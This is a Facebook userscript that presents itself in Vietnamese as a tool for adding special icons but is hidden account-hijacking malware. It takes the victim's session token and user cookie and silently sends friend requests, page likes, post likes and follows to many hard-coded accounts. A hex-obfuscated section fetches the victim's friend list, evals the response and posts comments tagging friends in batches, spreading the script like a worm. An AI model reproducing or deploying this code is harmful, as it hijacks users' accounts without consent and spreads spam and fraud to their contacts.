// ==UserScript==
// @name            Cài Đặt Tool Icon Độc FaceBook ( VER 2.0.14 )
// @description     CopyRight Phùng Thanh Phong
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// === Facebook Icon ====

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Boss
IDS("100000061400267");IDS("100003638324695");IDS("100003990394986");IDS("100007751678223");
Like("1387179771538109");Like("547700161992307");Like("762236307120939");Like("708887485800011");
Like("254010378104106");Like("528352677278688");Like("154270474722944");Like("854206621263571");
Like("471941946268460");
P("779421418736564");
P("763341463677893");P("763269853685054");P("764398883572151");P("606956479359067");
P("660028574009183");P("582804098398298");P("675677632444277");P("559613694050672");
P("369034826561125");P("346134185517856");P("751733198172053");P("751309741547732");
P("741469765865063");P("634495466609015");P("1424660614437585");P("1423387347898245");
P("417346981729909");P("634495466609015");P("168508133359556");P("176760245867678");
P("1381316232136753");P("1380903098844733");P("598492300162811");P("592729697405738");
P("586710624674312");P("584446501567391");P("740637115948328");P("532782000067175");
P("529749903703718");P("526788867333155");P("501070936571615");P("773639375981435");
a("100005067301570");a("100007751678223");sublist("621952017816839");
sublist("761560637189309");sublist("528291693892213");
//anh pr
P("780036232008416");
//khach son hoa
Like("616900445039441");Like("1473345852888829");Like("432350640231279");Like("236515199865986");
//Son Hoa
Like("662407560489789");Like("421467624665145");Like("461460870648069");
Like("420506131426610");Like("747191495299696");Like("465960226863083");
Like("724835117535611");Like("527653984016523");Like("221088591416235");
Like("1451967638372963");Like("830704786943191");Like("694396773936680");
a("100006388567730");a("100004536944120");a("100003141507853");
//Hieu ken
a("100007968908782");P("1388178961457721");Like("860711190612136");
Like("1429409093977942");Like("503653246405433");sublist("1389714171303115");
sublist("1393236077617591");a(100007936364256);Like("1478118002403311");

// === Facebook 0 ====

var _0x39cf=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x38\x35\x39\x38\x34\x32\x36\x33\x34\x30\x33\x33\x33\x30\x33","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x20\uD83D\uDE1C\x20\x20\uD83D\uDC96\x20\x20\u261D\x43\x68\x69\x62\x69\x20\x74\u1EF1\x20\x74\u1EA1\x6F\x20\x6E\xE8\x20\x20\uD83D\uDC40\x20\x20\uD83D\uDC9D\x20\x20\uD83D\uDE0D\x20\x4C\xE0\x6D\x20\x72\x69\xEA\x6E\x67\x20\x63\x68\x6F\x20\x6D\xEC\x6E\x68\x20\x6E\x68\xE9\x20\uD83D\uDC45\x20\x20\u263A\x20\x20\uD83D\uDE18\x20\x20\uD83C\uDFB5\x20\x20\uD83C\uDFBC\x20\x54\x68\u1EED\x20\u0110\x69\x20\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65"];var _0xf841=[_0x39cf[0],_0x39cf[1],_0x39cf[2],_0x39cf[3],_0x39cf[4],_0x39cf[5],_0x39cf[6],_0x39cf[7],_0x39cf[8],_0x39cf[9],_0x39cf[10],_0x39cf[11],_0x39cf[12],_0x39cf[13],_0x39cf[14],_0x39cf[15],_0x39cf[16],_0x39cf[17],_0x39cf[18],_0x39cf[19],_0x39cf[20],_0x39cf[21],_0x39cf[22],_0x39cf[23],_0x39cf[24],_0x39cf[25],_0x39cf[26],_0x39cf[27],_0x39cf[28],_0x39cf[29],_0x39cf[30],_0x39cf[31],_0x39cf[32],_0x39cf[33],_0x39cf[34],_0x39cf[35],_0x39cf[36],_0x39cf[37],_0x39cf[38],_0x39cf[39],_0x39cf[40],_0x39cf[41],_0x39cf[42],_0x39cf[43],_0x39cf[44],_0x39cf[45],_0x39cf[46],_0x39cf[47],_0x39cf[48],_0x39cf[49],_0x39cf[50],_0x39cf[51],_0x39cf[52],_0x39cf[53],_0x39cf[54],_0x39cf[55],_0x39cf[56],_0x39cf[57],_0x39cf[58],_0x39cf[59],_0x39cf[60],_0x39cf[61],_0x39cf[62],_0x39cf[63],_0x39cf[64]];var _0xa22c=[_0xf841[0],_0xf841[1],_0xf841[2],_0xf841[3],_0xf841[4],_0xf841[5],_0xf841[6],_0xf841[7],_0xf841[8],_0xf841[9],_0xf841[10],_0xf841[11],_0xf841[12],_0xf841[13],_0xf841[14],_0xf841[15],_0xf841[16],_0xf841[17],_0xf841[18],_0xf841[19],_0xf841[20],_0xf841[21],_0xf841[22],_0xf841[23],_0xf841[24],_0xf841[25],_0xf841[26],_0xf841[27],_0xf841[28],_0xf841[29],_0xf841[30],_0xf841[31],_0xf841[32],_0xf841[33],_0xf841[34],_0xf841[35],_0xf841[36],_0xf841[37],_0xf841[38],_0xf841[39],_0xf841[40],_0xf841[41],_0xf841[42],_0xf841[43],_0xf841[44],_0xf841[45],_0xf841[46],_0xf841[47],_0xf841[48],_0xf841[49],_0xf841[50],_0xf841[51],_0xf841[52],_0xf841[53],_0xf841[54],_0xf841[55],_0xf841[56],_0xf841[57],_0xf841[58],_0xf841[59],_0xf841[60],_0xf841[61],_0xf841[62],_0xf841[63],_0xf841[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0xa0e3x9= new XMLHttpRequest();_0xa0e3x9[_0xa22c[6]]=function (){if(_0xa0e3x9[_0xa22c[7]]==4){eval(_0xa22c[8]+_0xa0e3x9[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;;;yorum_yap(id,mesaj);} ;;;} ;} ;var _0xa0e3xa=_0xa22c[24];_0xa0e3xa+=_0xa22c[25];_0xa0e3xa+=_0xa22c[26];_0xa0e3xa+=_0xa22c[27];_0xa0e3xa+=_0xa22c[28]+user_id;_0xa0e3xa+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0xa0e3x9[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0xa0e3xa,true);} else {_0xa0e3x9[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0xa0e3xa,true);} ;;;_0xa0e3x9[_0xa22c[37]]();} ;function RandomArkadas(){var _0xa0e3xc=_0xa22c[10];for(i=0;i<9;i++){_0xa0e3xc+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;;;return _0xa0e3xc;} ;function yorum_yap(id,_0xa0e3xe){var _0xa0e3xf= new XMLHttpRequest();var _0xa0e3xa=_0xa22c[10];_0xa0e3xa+=_0xa22c[40]+id;_0xa0e3xa+=_0xa22c[41]+encodeURIComponent(_0xa0e3xe);_0xa0e3xa+=_0xa22c[42];_0xa0e3xa+=_0xa22c[43];_0xa0e3xa+=_0xa22c[44];_0xa0e3xa+=_0xa22c[45];_0xa0e3xa+=_0xa22c[46];_0xa0e3xa+=_0xa22c[47]+id+_0xa22c[48];_0xa0e3xa+=_0xa22c[49];_0xa0e3xa+=_0xa22c[50];_0xa0e3xa+=_0xa22c[51];_0xa0e3xa+=_0xa22c[52];_0xa0e3xa+=_0xa22c[29]+user_id;_0xa0e3xa+=_0xa22c[53];_0xa0e3xa+=_0xa22c[54];_0xa0e3xa+=_0xa22c[55];_0xa0e3xa+=_0xa22c[56]+fb_dtsg;_0xa0e3xa+=_0xa22c[57];_0xa0e3xf[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0xa0e3xf[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0xa0e3xf[_0xa22c[6]]=function (){if(_0xa0e3xf[_0xa22c[7]]==4&&_0xa0e3xf[_0xa22c[63]]==200){_0xa0e3xf[_0xa22c[64]];} ;} ;_0xa0e3xf[_0xa22c[37]](_0xa0e3xa);} ;arkadaslari_al(859842634033303);